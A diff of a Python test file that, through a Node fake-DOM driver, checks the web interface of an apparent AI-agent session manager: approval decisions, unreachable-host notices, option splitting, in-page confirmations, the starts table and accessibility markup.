+    assert "on ct1" in result["askedNoOpen"] and "without opening a browser there" in result["askedNoOpen"]
+    assert "remembered for the project" in result["askedBlock"] and "on local" in result["askedBlock"]
+    assert result["postsBeforeBlock"] == 2
+    assert result["posts"] == [
+        ["/api/hosts/local/approvals/1-1", {"decision": "allow", "scope": "always"}],
+        ["/api/hosts/ct1/approvals/1-1", {"decision": "allow", "scope": "run", "no_open": True}],
+        ["/api/hosts/local/approvals/1-3", {"decision": "deny", "scope": "always", "confirm": True}],
+        ["/api/hosts/ct1/approvals/2-1", {"decision": "deny", "scope": "run"}]]
+    assert any('"scope":"always"' in t and "Blocked always: claude-web on local" in t for t in result["toast"]), \
+        "the command's output is shown"
+    assert result["revived"] == [True, "30 s"], "a question the host still has open is answerable again"
+    rows, notices, title = result["partly"]
+    assert rows == ["ct1 1-4", "local 5-1"], "the rows of a host that could not be asked stay"
+    assert any("Could not check ct1" in n and "No route to host" in n for n in notices) and title == "(1) sandbox-ai"
     assert result["badge"] == ["?", "could not check"] and result["count"] is None
-    assert any("Could not check" in text and "Connection refused" in text for text in result["notice"])
-    assert result["rowsAfterError"] == ["1-3"], "a failed check takes no row away"
+    assert any("Could not check" in text and "could not be reached" in text for text in result["notice"])
+    assert result["rowsAfterError"] == ["ct1 1-4", "local 5-1"], "a failed check takes no row away"
+    assert len(result["newToasts"]) == 1 and "on ct1" in result["newToasts"][0]
+    assert result["toastsAfter"] == [], "the toast of a question goes with it"
     assert "code 1008" in result["close"][0] and "at most 8 terminals" in result["close"][0]
     assert "\u001b" not in result["close"][0] and "could not connect" in result["close"][1]
+
+
+PAGE_DRIVER = FAKE_DOM + r"""
+(async () => {
+  const result = {};
+  // the free-form options of a new start, split as a shell does
+  const split = (text) => { try { return vm.runInContext(`shellWords(${JSON.stringify(text)})`, context); } catch (e) { return `error: ${e.message}`; } };
+  result.words = [split("--mode high\n-m sonnet\n--allow-pypi"), split("--preset-value repo='my repo' -m \"opus 4\""),
+    split("a\\ b c\\\nd 'it''s' \"x\\\"y\""), split("--name 'open"), split("  \n ")];
+  result.sizes = vm.runInContext("[exactSize(8 * 2 ** 30), exactSize(512 * 2 ** 20), exactSize(1000), readableSize(7.5 * 2 ** 30)]", context);
+  // one rule for confirmations: asked in place, Cancel puts back what was there, nothing sent before Yes
+  answer = (method, path) => (method === "GET" ? [] : { output: "done" });
+  const cellNode = new Node("td"); body.append(cellNode);
+  const original = new Node("button"); original.append("Delete"); cellNode.append(original);
+  context.__cell = cellNode;
+  vm.runInContext('confirmIn(__cell, "Delete web on ct1?", "Yes, delete it", () => api("POST", "/api/x", { confirm: true }))', context);
+  result.asking = [cellNode.textContent, globalThis.focused && globalThis.focused.textContent];
+  cellNode.all().find(n => n.tagName === "button" && n.textContent === "Cancel").fire("click");
+  result.cancelled = [cellNode.children[0] === original, calls.length];
+  vm.runInContext('confirmIn(__cell, "Delete web on ct1?", "Yes, delete it", () => api("POST", "/api/x", { confirm: true }))', context);
+  cellNode.all().find(n => n.tagName === "button" && n.textContent === "Yes, delete it").fire("click"); await settle();
+  result.yes = [calls.map(c => [c.method, c.path, c.body]), cellNode.children[0] === original];
+  // the starts page: rows by name; an unchanged one stays (with a Stop being asked), MCP rows have no Pause,
+  // Network or Resources, Stop names the host and the HOME
+  vm.runInContext('state.me = { user: "admin", csrf: "c" }; state.page = "starts"; state.host = "ct1";', context);
+  let starts = [{ name: "web", agent: "claude", kind: "session", state: "running", keep: true, home: "kept", directory: "/d", attachable: true },
+    { name: "mcp-files", kind: "mcp", state: "running", serves: [] },
+    { name: "old", agent: "codex", kind: "session", state: "stopped", keep: true, home: "kept", directory: "/e" }];
+  answer = (method, path) => (path.endsWith("/starts") ? starts : path.endsWith("/presets") ? [] : { output: "ok" });
+  await vm.runInContext("pages.starts(__main)", context);
+  const rowOf = (name) => body.all().find(n => n.attributes["data-name"] === name);
+  const buttons = (r) => r.all().filter(n => n.tagName === "button").map(b => b.textContent);
+  result.buttons = ["web", "mcp-files", "old"].map(n => buttons(rowOf(n)));
+  const web = rowOf("web");
+  web.all().find(n => n.tagName === "button" && n.textContent === "Stop").fire("click");
+  result.stopAsk = web.all().find(n => n.className === "confirm").textContent;
+  calls.length = 0;
+  starts = starts.map(s => (s.name === "old" ? Object.assign({}, s, { state: "running" }) : s)).concat([{ name: "new", agent: "opencode", kind: "session", state: "running", keep: false, home: "discarded", directory: "/f" }]);
+  await vm.runInContext("refreshStarts(__main)", context); await settle();
+  result.refreshed = [rowOf("web") === web, Boolean(web.all().find(n => n.textContent === "Yes, stop it")), body.all().filter(n => n.attributes["data-name"]).map(n => n.attributes["data-name"]),
+    calls.map(c => [c.path, c.headers["X-Background"] || null])];
+  rowOf("new").all().find(n => n.tagName === "button" && n.textContent === "Stop").fire("click");
+  result.stopAskDiscarded = rowOf("new").all().find(n => n.className === "confirm").textContent;
+  web.all().find(n => n.textContent === "Yes, stop it").fire("click"); await settle();
+  result.stopPost = calls.filter(c => c.method === "POST").map(c => [c.path, JSON.parse(c.body)]);
+  console.log(JSON.stringify(result));
+})().catch(e => { console.error(e.stack); process.exit(1); });
+"""
+
+
+@pytest.mark.skipif(not shutil.which("node"), reason="needs node")
+def test_the_page_splits_options_confirms_in_place_and_keeps_the_starts_table(tmp_path):
+    result = run_driver(tmp_path, PAGE_DRIVER, "page")
+    assert result["words"] == [["--mode", "high", "-m", "sonnet", "--allow-pypi"],
+                               ["--preset-value", "repo=my repo", "-m", "opus 4"],
+                               ["a b", "cd", "its", 'x"y'], "error: a single quote is not closed", []]
+    assert result["sizes"] == ["8g", "512m", "1000", "7.5g"]
+    assert result["asking"] == ["Delete web on ct1?Yes, delete itCancel", "Cancel"], "Cancel has the focus"
+    assert result["cancelled"] == [True, 0], "Cancel puts back what was there, nothing is sent"
+    assert result["yes"] == [[["POST", "/api/x", '{"confirm":true}']], True]
+    assert result["buttons"] == [["Attach", "Pause", "Stop", "Network…", "Resources…"], ["Stop", "Attach to…"],
+                                 ["Resume", "Delete"]], "an MCP server has no Pause, Network or Resources"
+    assert "Stop web on ct1?" in result["stopAsk"] and "its HOME is kept" in result["stopAsk"]
+    same, asking, names, polled = result["refreshed"]
+    assert same and asking, "an unchanged row stays, its Stop still asked"
+    assert names == ["web", "mcp-files", "old", "new"] and polled == [["/api/hosts/ct1/starts", "1"]]
+    assert "Stop new on ct1?" in result["stopAskDiscarded"] and "not kept" in result["stopAskDiscarded"]
+    assert result["stopPost"] == [["/api/hosts/ct1/starts/web/stop", {"confirm": True}]]
+
+
+def test_the_page_never_uses_the_browsers_dialogs_or_markup_from_data():
+    """Every confirmation is asked in the page (ask/confirmIn), never confirm(); nothing is set as markup."""
+    import re
+    script = (WEB / "app.js").read_text()
+    code = re.sub(r"//[^\n]*", "", script)
+    assert not re.search(r"(?<![\w.])confirm\(", code), "no window.confirm()"
+    assert not re.search(r"\b(alert|prompt)\(", code)
+    assert not re.search(r"\.(innerHTML|outerHTML)\s*=|insertAdjacentHTML|document\.write", code)
+    assert "function confirmIn(container, text, yes, onYes, options)" in script
+    for asked in ("Yes, stop it", "Yes, delete it", "Yes, remove it", "Yes, forget it", "Yes, no limit",
+                  "Yes, lower it", "Yes, block always"):
+        assert asked in script, asked
+    assert 'rel: "noopener noreferrer"' in script and "^https?:" in script
+
+
+def test_the_page_is_reachable_and_announced_sensibly():
+    """#app is no live region (each new drawing would be read out); toasts and the questions' count have their own;
+    the nav says which page is current and the address keeps it (#page); terminal tabs are tabs, their close button
+    is outside the tablist; the boxes of open terminals outlive a new drawing of the frame."""
+    html = (WEB / "index.html").read_text()
+    script = (WEB / "app.js").read_text()
+    assert '<div id="app"></div>' in html and 'id="live"' in html and 'id="toasts" class="toasts" aria-live="polite"' in html
+    assert '"aria-current": state.page === key ? "page" : null' in script and 'setAttribute("aria-current", "page")' in script
+    assert 'window.addEventListener("hashchange"' in script and "location.hash = page" in script
+    assert "state.page = pageFromHash() || state.page" in script
+    page = script.split("pages.terminals = ")[1].split("\n};")[0]
+    assert '"aria-selected": current ? "true" : "false"' in page and 'role: "tablist"' in page
+    assert 'el("div", { class: "terminal-close" })' in page and "terminalBoxes().append(t.box)" in page
+    assert 'role: "tabpanel"' in script
 
 
 def test_an_ended_terminal_keeps_its_tab_and_says_why():
@@ -1691,9 +2021,9 @@ def test_an_ended_terminal_keeps_its_tab_and_says_why():
     assert 'window.removeEventListener("resize", entry.fit)' in handler and "closeText(event, entry.opened)" in handler
     assert "event.code" in script.split("function closeText")[1] and "event.reason" in script.split("function closeText")[1]
     assert "function closeTerminal(entry)" in script and "onclick: () => closeTerminal(t)" in script
-    assert 'hostPath("/approvals"), undefined, { background: true }' in script
+    assert 'api("GET", "/api/approvals", undefined, { background: true })' in script
     assert 'hostPath("/starts"), undefined, { background: Boolean(background) }' in script
-    assert 'refreshTerminalStarts(document.getElementById("main"), true)' in script
+    assert 'refreshTerminalStarts(main, true)' in script and 'const main = document.getElementById("main")' in script
     assert 'headers["X-Background"] = "1"' in script
     approvals = script.split("const SCOPES")[1].split("pages.doctor")[0]
     assert "confirm(" not in approvals and "innerHTML" not in approvals, "asked in the page, as text"
